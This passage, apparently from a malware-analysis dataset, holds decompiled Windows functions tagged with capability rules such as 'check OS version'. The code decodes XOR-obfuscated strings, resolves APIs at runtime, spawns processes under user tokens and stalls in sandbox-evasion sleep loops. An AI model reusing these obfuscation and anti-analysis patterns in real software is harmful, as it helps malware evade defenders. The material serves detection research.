var_2ch._2_1_ = 6;\n                    stack0xffffffd3 = 0x43761568;\n                    var_28h._3_1_ = 0x6e;\n                    var_24h._0_1_ = 0x1c;\n                    var_24h._1_1_ = 0x7a;\n                    var_24h._2_1_ = 0x58;\n                    stack0xffffffdb = 0x2680b30;\n                    var_20h._3_1_ = 0x76;\n                    var_1ch._0_1_ = 0x55;\n                    var_1ch._1_1_ = 0x6e;\n                    var_1ch._2_1_ = 0x68;\n                    var_1ch._3_1_ = 0x7a;\n                    var_8h = 0x7a686e30;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x76);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    lpApplicationName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_64h = &var_30h - lpApplicationName;\n                    do {\n                        puVar1 = iVar4 + lpApplicationName;\n                        iVar7 = iVar4 % var_78h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_8h + iVar7) ^ puVar1[var_64h];\n                    } while (iVar4 < 0x18);\n                    var_d8h = var_54h;\n                    var_b0h._0_2_ = 0;\n                    var_b4h = 1;\n                    var_2ch._0_2_ = 0x6f78;\n                    var_2ch._2_1_ = 0x13;\n                    stack0xffffffd3 = 0x78340745;\n                    var_28h._3_1_ = 0x6f;\n                    var_24h._0_1_ = 0x1a;\n                    var_24h._1_1_ = 0x45;\n                    var_24h._2_1_ = 0x54;\n                    stack0xffffffdb = 0x456f7f34;\n                    var_20h._3_1_ = 0x45;\n                    var_1ch._0_1_ = 0x74;\n                    var_1ch._1_1_ = 0x34;\n                    var_14h = 0x45366f5a;\n                    var_10h._0_2_ = 0x3474;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    var_64h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_8h = &var_2ch - var_64h;\n                    do {\n                        puVar1 = iVar4 + var_64h;\n                        iVar7 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_2ch - var_64h];\n                    } while (iVar4 < 0x12);\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hObject, lpApplicationName, 0, 0, 0, 0, var_60h, var_58h, 0, &var_e0h, var_5ch);\n                    var_2ch._0_2_ = 0x7400;\n                    var_2ch._2_1_ = 9;\n                    stack0xffffffd3 = 0xd611f72;\n                    var_28h._3_1_ = 0x74;\n                    var_24h._0_1_ = 0xf;\n                    var_24h._1_1_ = 0x72;\n                    var_24h._2_1_ = 0x18;\n                    stack0xffffffdb = 0x17741661;\n                    var_20h._3_1_ = 0x72;\n                    var_1ch._0_1_ = 0x71;\n                    var_1ch._1_1_ = 0x61;\n                    var_14h = 0x72787478;\n                    var_10h._0_2_ = 0x6171;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar7 = 0;\n                    var_8h = &var_2ch - iVar4;\n                    do {\n                        puVar1 = iVar7 + iVar4;\n                        iVar5 = iVar7 % var_48h;\n                        iVar7 = iVar7 + 1;\n                        *puVar1 = *(&var_14h + iVar5) ^ puVar1[&var_2ch - iVar4];\n                    } while (iVar7 < 0x12);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_60h = iVar4;\n                    if (*var_5ch != 0) {\n                        var_18h = 0x3419431d;\n                        var_14h = 0x1a532150;\n                        var_10h._0_2_ = 0x310b;\n                        var_48h = 0x6675374f;\n                        var_44h._0_1_ = 0x31;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar4 = 0;\n                        var_8h = &var_18h - iVar7;\n                        do {\n                            puVar1 = iVar4 + iVar7;\n                            iVar5 = iVar4 % var_78h;\n                            iVar4 = iVar4 + 1;\n                            *puVar1 = *(&var_48h + iVar5) ^ puVar1[&var_18h - iVar7];\n                        } while (iVar4 < 10);\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_5ch, 0x201eb, &TokenHandle);\n                        iVar4 = var_60h;\n                        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (iVar5 != 0) {\n                            fcn.0040754b();\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_5ch[1]);\n                        uVar3 = (*pcVar6)(0, iVar7);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    }\n                    iVar7 = var_64h;\n                    if (var_58h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_58h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                    uVar3 = (*pcVar6)(0, iVar4);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*pcVar6)(0, iVar7);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar6)(0, lpApplicationName);\n                    (*pcVar2)(uVar3);\n                    uVar3 = (*pcVar6)(0, var_54h);\n                    (*pcVar2)(uVar3);\n                    iVar7 = var_68h;\n                    iVar4 = var_40h;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n            uVar3 = (*pcVar6)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar4 = var_8ch;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n        uVar3 = (*pcVar6)(0, iVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar7 = *var_5ch;\n    uVar3 = (*pcVar6)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar7;\n}\n",
        "token_count": 4574
    },
    "00408bec": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408bec(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    ushort var_32h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    code *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_40h = 0xb452c32;\n    var_3ch._0_1_ = 0x13;\n    var_3ch._1_1_ = 0x14;\n    var_3ch._2_2_ = 0x7b6a;\n    var_38h._0_1_ = 0x19;\n    var_18h = 1;\n    var_38h._1_1_ = 1;\n    var_38h._2_2_ = 0x141a;\n    var_34h = 0x59;\n    var_30h = 0x65374959;\n    var_2ch._0_2_ = 0x7876;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0x6;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + var_ch;\n        iVar6 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_40h - var_ch];\n    } while (iVar9 < 0xd);\n    var_3ch._0_1_ = 8;\n    var_3ch._1_1_ = 8;\n    var_3ch._2_2_ = 0x531a;\n    var_38h._0_1_ = 6;\n    var_38h._1_1_ = 0x3a;\n    var_38h._2_2_ = 0x190e;\n    var_34h = 0x76;\n    var_33h = 0x47;\n    var_28h = 0x3774614e;\n    var_24h._0_1_ = 0x47;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 5;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + var_14h;\n        iVar6 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_28h + iVar6) ^ puVar1[&var_3ch - var_14h];\n    } while (iVar9 < 10);\n    var_40h = 0x2558252e;\n    var_3ch._0_1_ = 0x13;\n    var_3ch._1_1_ = 5;\n    var_3ch._2_2_ = 0x5e0f;\n    var_38h._0_1_ = 0x29;\n    var_38h._1_1_ = 0x16;\n    var_38h._2_2_ = 0x3d28;\n    var_34h = 0x58;\n    var_33h = 0x2a;\n    var_32h = 0x6933;\n    var_20h = 0x47374969;\n    var_1ch._0_1_ = 0x72;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = var_ch;\n    iVar6 = 0;\n    var_10h = &var_40h - var_28h;\n    do {\n        puVar1 = iVar6 + var_28h;\n        iVar7 = iVar6 % var_4h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_40h - var_28h];\n        pcVar4 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (iVar6 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ch, var_28h);\n    var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    iVar6 = var_14h;\n    uVar3 = (*pcVar4)(iVar9, var_14h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar3 = var_8h;\n    iVar2 = (*pcVar4)(var_8h);\n    if (iVar2 == 0) {\n        iVar2 = (*var_10h)(uVar3);\n        if (iVar2 == 0) {\n            var_40h = 0x30245b74;\n            var_3ch._0_1_ = 0x27;\n            var_3ch._1_1_ = 0x5f;\n            var_3ch._2_2_ = 0x2f76;\n            var_38h._0_1_ = 0x36;\n            var_38h._1_1_ = 7;\n            var_38h._2_2_ = 0x5847;\n            var_34h = 0x26;\n            var_33h = 0x13;\n            var_32h = CONCAT11(var_32h._1_1_, 0x46);\n            var_30h = 0x524b3733;\n            var_2ch._0_1_ = 0x46;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n            var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = 0;\n            do {\n                pcVar4 = var_10h + iVar9;\n                iVar6 = iVar9 % var_4h;\n                iVar9 = iVar9 + 1;\n                *pcVar4 = *(&var_30h + iVar6) ^ pcVar4[&var_40h - var_10h];\n            } while (iVar9 < 0xf);\n            var_3ch._0_1_ = 0x28;\n            var_3ch._1_1_ = 0x51;\n            var_3ch._2_2_ = 0x3930;\n            var_38h._0_1_ = 0x1a;\n            var_38h._1_1_ = 6;\n            var_38h._2_2_ = 0x1558;\n            var_34h = 0x78;\n            var_30h = 0x78543569;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x6e);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = var_ch;\n            iVar7 = 0;\n            var_20h = &var_3ch - iVar6;\n            do {\n                puVar1 = iVar7 + iVar6;\n                iVar8 = iVar7 % var_4h;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_30h + iVar8) ^ puVar1[&var_3ch - iVar6];\n            } while (iVar7 < 9);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ch, iVar6);\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar9, var_10h);\n            pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            (*pcVar5)(var_8h);\n            (*pcVar4)(var_8h);\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar4)(0, var_10h);\n            (*pcVar5)(uVar3);\n            iVar6 = var_14h;\n            goto code_r0x00408e9a;\n        }\n    }\n    var_18h = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\ncode_r0x00408e9a:\n    uVar3 = (*pcVar4)(0, var_28h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar9);\n    (*pcVar5)(uVar3);\n    return var_18h;\n}\n",
        "token_count": 2308
    },
    "0040a831": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a831(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    int32_t *lpLibFileName;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t dwSize;\n    \n    var_ch = 0xffffffff;\n    var_8h = 5;\n    var_1ch = param_2;\n    if (*0x41cd38 == NULL) {\n        var_2ch = 0x141c065d;\n        var_28h = 0x14161d5b;\n        var_24h._0_2_ = 0x3714;\n        var_14h = 0x78787233;\n        var_10h._0_1_ = 0x37;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar10 = 0;\n        do {\n            puVar1 = iVar10 + lpLibFileName;\n            iVar8 = iVar10 % var_8h;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_14h + iVar8) ^ puVar1[&var_2ch - lpLibFileName];\n        } while (iVar10 < 10);\n        var_48h = 0x3b291601;\n        var_44h = 0x2b1b3d24;\n        var_40h = 0x73b3237;\n        var_3ch = 0x292f0715;\n        var_38h = 0x20230a0d;\n        var_34h = 0x20170b3b;\n        var_30h._0_1_ = 0x41;\n        var_28h = 0x4e78624f;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x41);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar10 = lpLibFileName;\n        iVar11 = 0;\n        do {\n            puVar1 = iVar11 + iVar8;\n            iVar9 = iVar11 % var_8h;\n            iVar11 = iVar11 + 1;\n            *puVar1 = *(&var_28h + iVar9) ^ puVar1[&var_48h - iVar8];\n        } while (iVar11 < 0x19);\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar8);\n        *0x41cd38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, iVar10);\n        (*pcVar2)(uVar4);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41cd38)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar5 != NULL) {\n            lpLibFileName = piVar5;\n            iVar10 = (**0x41cd38)(5, piVar5, dwSize, 0);\n            uVar4 = var_1ch;\n            if (-1 < iVar10) {\n                var_ch = 0;\n                piVar12 = piVar5;\n                do {\n                    iVar10 = piVar12[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41caec)) {\n                        uVar6 = fcn.0040f276();\n                        uVar7 = fcn.0040403a();\n                        iVar10 = (*var_20h)(piVar12[0xf], uVar7, piVar12[0x11], piVar12[0x12], uVar6, uVar4);\n                        piVar5 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar5 = lpLibFileName;\n                    if (*piVar12 == 0) break;\n                    piVar12 = piVar12 + *piVar12;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar5, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1303
    },
    "0040b556": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b556(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    uint uStack1412;\n    uchar *puStack1408;\n    uint uStack1404;\n    uint uStack1400;\n    uint uStack1396;\n    uchar *puStack1392;\n    uint uStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uchar *puStack1376;\n    uint uStack1372;\n    uint uStack1368;\n    int32_t iStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uint uStack1348;\n    uint uStack1344;\n    uint uStack1340;\n    int32_t iStack1324;\n    code *pcStack1320;\n    uint8_t auStack1316 [2];\n    ushort uStack1314;\n    uint uStack1312;\n    uchar uStack1308;\n    ushort uStack1307;\n    uchar uStack1305;\n    uint uStack1304;\n    ushort uStack1300;\n    uchar uStack1298;\n    uint uStack1297;\n    uint uStack1293;\n    uint uStack1289;\n    uint uStack1285;\n    uint uStack1281;\n    uint uStack1277;\n    uint uStack1273;\n    uint uStack1269;\n    uchar uStack1265;\n    int16_t iStack1264;\n    uchar uStack1262;\n    uint uStack1261;\n    uint uStack1257;\n    uint uStack1253;\n    uint uStack1249;\n    uint uStack1245;\n    uint uStack1241;\n    uint uStack1237;\n    uint32_t uStack1233;\n    uint32_t uStack1229;\n    uint uStack1225;\n    uint uStack1221;\n    uint uStack1217;\n    uchar uStack1213;\n    uchar uStack1212;\n    uchar uStack1211;\n    ushort uStack1210;\n    uint32_t uStack1208;\n    int32_t iStack1204;\n    int32_t iStack1192;\n    uint uStack1180;\n    uint uStack1176;\n    uint uStack1172;\n    int32_t iStack1164;\n    uint uStack1160;\n    int16_t iStack1148;\n    uchar auStack1146 [2];\n    uint uStack1144;\n    uchar auStack1136 [12];\n    uchar auStack1124 [4];\n    uchar auStack1120 [52];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1144 = 0x200;\n    uStack1312 = 0xb452c32;\n    puVar13 = &stack0xfffffbf8;\n    for (iVar9 = 0x400; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack1308 = 0x13;\n    uStack1307 = 0x6a14;\n    uStack1305 = 0x7b;\n    puVar13 = &stack0xfffffb90;\n    for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack1340 = 0xe;\n    uStack1304 = 0x141a0119;\n    puVar13 = &stack0xfffffbd4;\n    for (iVar9 = 0x24; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack1344 = 8;\n    uStack1300 = CONCAT11(uStack1300._1_1_, 0x59);\n    pcStack1320 = 0x65374959;\n    auStack1316[0] = 0x76;\n    auStack1316[1] = 0x78;\n    uStack1348 = 0x40b5d0;\n    uStack1348 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1352 = 0x40b5d7;\n    iStack1164 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack1180 = 6;\n    uStack1160 = 0;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iStack1164;\n        iVar11 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = (&stack0xfffffacc)[iVar11] ^ puVar1[&stack0xfffffad4 + -iStack1164];\n    } while (iVar9 < 0xd);\n    uStack1352 = 0x15;\n    uStack1356 = 8;\n    iStack1324 = 0xf461d70;\n    uStack1172 = 5;\n    pcStack1320 = 0xe5e3905;\n    auStack1316[0] = 0x57;\n    auStack1316[1] = 0x12;\n    uStack1314 = 0x3e1d;\n    uStack1312 = 0x85f1d43;\n    uStack1308 = 10;\n    uStack1307 = 0x582b;\n    uStack1305 = 0x78;\n    uStack1360 = 0x40b66f;\n    uStack1360 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iStack1364 = 0x40b676;\n    iStack1364 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar9 = 0;\n    iStack1164 = iStack1364;\n    do {\n        puVar1 = iVar9 + iStack1364;\n        iVar11 = iVar9 % iStack1192;\n        iVar9 = iVar9 + 1;\n        *puVar1 = (&stack0xfffffac0)[iVar11] ^ puVar1[&stack0xfffffac8 + -iStack1364];\n    } while (iVar9 < 0x14);\n    uStack1368 = uStack1176;\n    uStack1372 = 0x40b6b6;\n    uStack1372 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1376 = 0x40b6bd;\n    uStack1304 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    puStack1376 = &stack0xfffffb6c;\n    uStack1172 = 0x40;\n    uStack1380 = 0x40b6da;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    uStack1380 = 0xbd;\n    uStack1384 = 8;\n    uStack1304 = 0x550f620d;\n    uStack1300 = 0x451e;\n    uStack1298 = 6;\n    uStack1297 = 0x246c226e;\n    uStack1293 = 0x9551c62;\n    uStack1289 = 0x116e3e45;\n    uStack1285 = 0x3d62006c;\n    uStack1281 = 0x30452f55;\n    uStack1277 = 0x156c1c6e;\n    uStack1273 = 0x25553a62;\n    uStack1269 = 0x1b6e2d45;\n    uStack1265 = 0x6c;\n    iStack1264 = 0x6219;\n    uStack1262 = 0x3d;\n    uStack1261 = 0x11451555;\n    uStack1257 = 0x206c216e;\n    uStack1253 = 0x30550362;\n    uStack1249 = 0x306e2145;\n    uStack1245 = 0x1a622b6c;\n    uStack1241 = 0x3451e55;\n    uStack1237 = 0x156c396e;\n    uStack1233 = 0x3551c62;\n    uStack1229 = 0x306e0145;\n    uStack1225 = 0x1d62366c;\n    uStack1221 = 0x10450355;\n    uStack1217 = 0x756c096e;\n    uStack1213 = 0x62;\n    uStack1212 = 0x6e;\n    uStack1211 = 0x55;\n    uStack1360 = 0x556e6245;\n    uStack1356 = CONCAT31(uStack1356._1_3_, 0x6c);\n    uStack1388 = 0x40b7e4;\n    uStack1388 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1392 = 0x40b7eb;\n    iStack1324 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iStack1324;\n        iVar11 = iVar9 % CONCAT22(uStack1210, CONCAT11(uStack1211, uStack1212));\n        iVar9 = iVar9 + 1;\n        *puVar1 = (&stack0xfffffaa4)[iVar11] ^ puVar1[&stack0xfffffadc + -iStack1324];\n    } while (iVar9 < 0x5e);\n    if (pcStack1320 == NULL) {\n        puStack1392 = &stack0xfffffba0;\n        uStack1396 = 0x40b83b;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        puStack1392 = &stack0xfffffba0;\n        uStack1396 = 0x40b82b;\n        (*pcStack1320)();\n    }\n    uStack1396 = 0x15;\n    uStack1400 = 8;\n    uStack1368 = 0x78266601;\n    iStack1364 = 0x6637753e;\n    uStack1360 = CONCAT22(uStack1360._2_2_, 0x7843);\n    puStack1376 = 0x78436659;\n    uStack1372 = CONCAT22(uStack1372._2_2_, 0x7551);\n    uStack1404 = 0x40b86d;\n    uStack1404 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1408 = 0x40b874;\n    uVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uVar7 = uStack1340;\n    iVar9 = 0;\n    uVar3 = uStack1233 & 0xff;\n    uStack1233 = uVar3 | uVar6 << 8;\n    uStack1229 = uStack1229 & 0xffffff00 | uVar6 >> 0x18;\n    do {\n        puVar1 = iVar9 + uVar6;\n        uStack1233._0_1_ = uVar3;\n        iVar11 = iVar9 % CONCAT13(uStack1233, uStack1237._1_3_);\n        iVar9 = iVar9 + 1;\n        *puVar1 = (&stack0xfffffa94)[iVar11] ^ puVar1[&stack0xfffffa9c + -uVar6];\n    } while (iVar9 < 10);\n    puStack1408 = &stack0xfffffb38;\n    uStack1412 = uStack1340;\n    iVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(reloc.WS2_32.dll_bind);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 == 0) {\n        puStack1392 = 0x49283617;\n        uStack1388 = 0x5a554724;\n        uStack1384 = 0x36344b2c;\n        uStack1380 = 0x47244929;\n        puStack1376 = 0x4b075a44;\n        uStack1372 = 0x49373626;\n        uStack1368 = 0x5a65472e;\n        iStack1364 = 0x36354b3d;\n        uStack1360 = 0x47254933;\n        uStack1356 = 0x4b495a51;\n        uStack1400 = 0x495a3647;\n        uStack1396 = CONCAT31(uStack1396._1_3_, 0x4b);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        iVar11 = 0;\n        uStack1360 = &stack0xfffffa84 + -iVar9;\n        do {\n            puVar1 = iVar11 + iVar9;\n            iVar12 = iVar11 % CONCAT13(uStack1249, uStack1253._1_3_);\n            iVar11 = iVar11 + 1;\n            *puVar1 = (&stack0xfffffa7c)[iVar12] ^ puVar1[&stack0xfffffa84 + -iVar9];\n        } while (iVar11 < 0x28);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                  (CONCAT13(uStack1245, uStack1249._1_3_), iVar9, 0, 0, &stack0xfffffb9c, &stack0xfffffb2c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = CONCAT13(uStack1277, uStack1281._1_3_);\n        piVar10 = &stack0xfffffb84;\n        do {\n            iVar2 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar2 != iStack1264);\n        if (piVar10 - &stack0xfffffb86 >> 1 != 0) {\n            while (iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, uVar6),  iVar11 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(CONCAT13(uStack1269, uStack1273._1_3_));\n        uVar7 = (*pcVar4)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n        uVar7 = uStack1352;\n    }\n    while ((iStack1204 == 0 && (uStack1208 < 2100000000))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    uVar8 = (*pcVar4)(0, uVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar7 = (*pcVar4)(0, uVar7);\n    (*pcVar5)(uVar7);\n    uVar7 = (*pcVar4)(0, CONCAT13(uStack1241, uStack1245._1_3_));\n    (*pcVar5)(uVar7);\n    uVar7 = (*pcVar4)(0, CONCAT13(uStack1265, uStack1269._1_3_));\n    (*pcVar5)(uVar7);\n    return;\n}\n",
        "token_count": 3613
    },
    "0040ba74": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
